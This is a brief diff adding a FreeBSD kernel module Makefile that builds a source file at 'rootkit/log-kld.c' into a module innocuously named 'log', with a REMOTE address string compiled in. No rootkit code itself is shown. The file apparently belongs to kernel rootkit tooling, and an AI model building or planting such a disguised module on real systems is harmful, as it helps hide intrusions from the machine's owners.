@@ -1,0 +1,7 @@
+KMOD=log
+SRCS=rootkit/log-kld.c
+
+CFLAGS+=-DREMOTE='"${REMOTE}"'
+
+.include <bsd.kmod.mk>
+
